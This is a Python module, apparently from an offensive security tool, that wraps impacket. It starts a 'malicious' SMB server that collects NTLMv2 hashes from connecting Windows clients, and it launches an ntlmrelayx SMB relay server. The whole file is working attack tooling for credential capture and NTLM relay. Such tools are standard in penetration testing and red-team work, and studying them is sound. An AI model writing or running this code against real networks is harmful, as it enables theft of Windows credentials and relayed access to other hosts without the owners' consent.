from impacket.smbserver import SimpleSMBServer
import logging
from loguru import logger
from .interceptlogging import (
    InterceptHandlerStdoutNtlmRelay,
    InterceptHandlerOnlyFilesNtlmRelay,
    InterceptHandlerStdoutMss,
    InterceptHandlerOnlyFilesMss,
)

from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
import cmd2


class MaliciousSmbServer:
    """[ Class that contains the configuration for the smbserver ]

    Args:
        lhost (str): [ ip of the host that will start the smb server ]
        port (str): [ port for the smb server ]
    """

    def __init__(
        self,
        lhost: str,
        port: str,
        info_logger:logger,
        ntlmv2_collected: dict = None,
        asynchronous: bool = None,
        path_file: str = None,
        alerts_dictionary: dict = None,
    ) -> None:
        self.__lhost = lhost
        self.__port = port
        self.__info_logger = info_logger
        self.__asynchronous = asynchronous
        self.__alerts_dictionary = alerts_dictionary
        self.__path_file = path_file
        self.__ntlmv2_collected = ntlmv2_collected

    @property
    def lhost(self) -> str:
        return self.__lhost

    @property
    def port(self) -> str:
        return self.__port

    @port.setter
    def port(self, port: str) -> None:
        self.__port = port

    @lhost.setter
    def lhost(self, lhost: str) -> None:
        self.__lhost = lhost

    def start_malicious_smbserver(self) -> None:
        """[ Function to start the smb server ]"""
        self.__info_logger.info("Starting Malicious SMB Server ...")
        if self.__asynchronous:
            logging.basicConfig(
                handlers=[
                    InterceptHandlerOnlyFilesMss(
                        self.__alerts_dictionary,
                        self.__path_file,
                        self.__ntlmv2_collected
                    )
                ],
                level=0,
            )
        else:
            logging.basicConfig(
                handlers=[InterceptHandlerStdoutMss(self.__path_file, self.__ntlmv2_collected)], level=0
            )
        server = SimpleSMBServer(self.__lhost, int(self.__port))
        server.setSMBChallenge("")
        server.start()


class SmbRelayServer:
    def __init__(
        self,
        config: NTLMRelayxConfig,
        info_logger: logger,
        asynchronous: bool = None,
        alerts_dictionary: dict = None,
    ) -> None:
        self.__info_logger = logger
        self.__asynchronous = asynchronous
        self.__config = config
        self.__alerts_dictionary = alerts_dictionary

    @property
    def asynchronous(self) -> bool:
        return self.__asynchronous

    def start_smb_relay_server(self) -> None:
        if self.__asynchronous:
            logging.basicConfig(
                handlers=[InterceptHandlerOnlyFilesNtlmRelay(self.__alerts_dictionary)],
                level=0,
            )
            self.__info_logger.info("Starting smb-relay server...")
        else:
            logging.basicConfig(handlers=[InterceptHandlerStdoutNtlmRelay()], level=0)
            self.__info_logger.info("Starting smb-relay server...")

        server = SMBRelayServer(self.__config)
        server.daemon = True
        server.start()
        server.join()
